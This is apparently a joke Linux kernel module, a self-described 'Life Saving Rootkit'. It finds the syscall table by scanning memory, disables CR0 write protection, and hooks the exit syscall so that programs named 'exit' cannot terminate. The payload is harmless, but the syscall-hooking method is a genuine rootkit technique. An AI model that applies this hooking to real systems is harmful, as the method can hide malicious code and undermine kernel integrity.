#include <linux/module.h>
#include <linux/syscalls.h>
#include <asm/paravirt.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <asm/uaccess.h>

unsigned long **sys_call_table;
unsigned long original_cr0;
asmlinkage long (*ref_sys_exit)(int error_code);
asmlinkage long new_sys_exit(int error_code)
{
  if((strcmp(current->comm, "exit") == 0)) // if the program name is "exit"
  {
    printk("[preventd] Dear god... %s tried to kill itself :(\n", current->comm);
    printk("[preventd] Crisis Averted, whew.\n");
    return 0;
  }
  else{
    return ref_sys_exit(error_code);
  }
}
    static unsigned long **aquire_sys_call_table(void)
  {

    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;
    while (offset < ULLONG_MAX) {
      sct = (unsigned long **)offset;
      if (sct[__NR_close] == (unsigned long *) sys_close) {
        printk("Syscall table found at: %lx\n", offset);
        return sct;
      }

      offset += sizeof(void *);
    }
    return NULL;
  }

  static int __init rootkit_start(void)
{
  if(!(sys_call_table = aquire_sys_call_table()))
    return -1;
    original_cr0 = read_cr0();
    write_cr0(original_cr0 & ~0x00010000);
    ref_sys_exit = (void *)sys_call_table[__NR_exit];
    sys_call_table[__NR_exit] = (unsigned long *)new_sys_exit;
    write_cr0(original_cr0);
    printk("[preventd] Life Saving Rootkit activated.\n");
    return 0;
  }

  static void __exit rootkit_end(void)
{

  if(!sys_call_table) {
    return;
  }

  write_cr0(original_cr0 & ~0x00010000);
  sys_call_table[__NR_exit] = (unsigned long *)ref_sys_exit;
  write_cr0(original_cr0);
  printk("[preventd] Think of the programs. \n");
}
module_init(rootkit_start);
module_exit(rootkit_end);
MODULE_LICENSE("GPL");
